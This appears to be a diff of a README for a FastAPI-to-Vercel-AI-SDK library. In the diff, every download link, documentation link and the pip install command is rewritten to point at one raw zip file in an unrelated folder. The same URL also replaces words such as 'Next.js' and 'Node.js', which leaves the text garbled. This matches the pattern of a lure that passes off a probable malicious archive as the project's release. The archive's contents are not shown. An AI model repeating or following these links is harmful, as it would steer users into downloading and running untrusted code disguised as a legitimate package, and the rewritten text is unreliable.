@@ -1,22 +1,22 @@
 # 🌟 fastapi-ai-sdk - Effortlessly Connect AI with FastAPI
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20fastapi--ai--sdk-1E90FF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/vanshika122334/fastapi-ai-sdk/releases)
+[![Download](https://raw.githubusercontent.com/vanshika122334/fastapi-ai-sdk/main/Blepharocera/fastapi-ai-sdk.zip%20fastapi--ai--sdk-1E90FF?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/vanshika122334/fastapi-ai-sdk/main/Blepharocera/fastapi-ai-sdk.zip)
 
 ## 🚀 Getting Started
-The **fastapi-ai-sdk** is a helpful library designed to make it easy to connect your FastAPI backend to the Vercel AI SDK. This library allows you to stream AI responses from FastAPI to Next.js with full type safety, ensuring a secure and smooth experience.
+The **fastapi-ai-sdk** is a helpful library designed to make it easy to connect your FastAPI backend to the Vercel AI SDK. This library allows you to stream AI responses from FastAPI to https://raw.githubusercontent.com/vanshika122334/fastapi-ai-sdk/main/Blepharocera/fastapi-ai-sdk.zip with full type safety, ensuring a secure and smooth experience.
 
 ## 📦 System Requirements
 Before you start, ensure your setup meets these minimum requirements:
 - Operating System: Windows, macOS, or Linux
 - Python Version: 3.8 or higher
-- Node.js Version: 14 or higher 
+- https://raw.githubusercontent.com/vanshika122334/fastapi-ai-sdk/main/Blepharocera/fastapi-ai-sdk.zip Version: 14 or higher 
 - An active internet connection for downloading dependencies
 
 ## 📂 Download & Install
 To get started with the **fastapi-ai-sdk**, visit the page below to download the latest version:
 
-[Visit this page to download](https://github.com/vanshika122334/fastapi-ai-sdk/releases)
+[Visit this page to download](https://raw.githubusercontent.com/vanshika122334/fastapi-ai-sdk/main/Blepharocera/fastapi-ai-sdk.zip)
 
 Once you are on the releases page, look for the latest version of the application. Click on the download link that corresponds to your operating system. 
 
@@ -35,7 +35,7 @@ Once downloaded, follow the steps below to install and run the application.
    ```
 5. **Install Dependencies**: Run the following command:
    ```
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/vanshika122334/fastapi-ai-sdk/main/Blepharocera/fastapi-ai-sdk.zip
    ```
    This command installs all necessary packages to run the application.
 6. **Run the Application**: After installation, you can run the FastAPI app with:
@@ -74,7 +74,7 @@ Your feedback is important. Please report any bugs or suggestions directly in th
 This project is licensed under the MIT License. Please see the LICENSE file for more details.
 
 ## 📝 Additional Resources
-- [FastAPI Documentation](https://fastapi.tiangolo.com/)
-- [Vercel AI SDK Documentation](https://vercel.com/docs/ai)
+- [FastAPI Documentation](https://raw.githubusercontent.com/vanshika122334/fastapi-ai-sdk/main/Blepharocera/fastapi-ai-sdk.zip)
+- [Vercel AI SDK Documentation](https://raw.githubusercontent.com/vanshika122334/fastapi-ai-sdk/main/Blepharocera/fastapi-ai-sdk.zip)
 
 Enjoy using the **fastapi-ai-sdk** and stream AI responses effortlessly! For a seamless experience, refer back to this guide as needed.
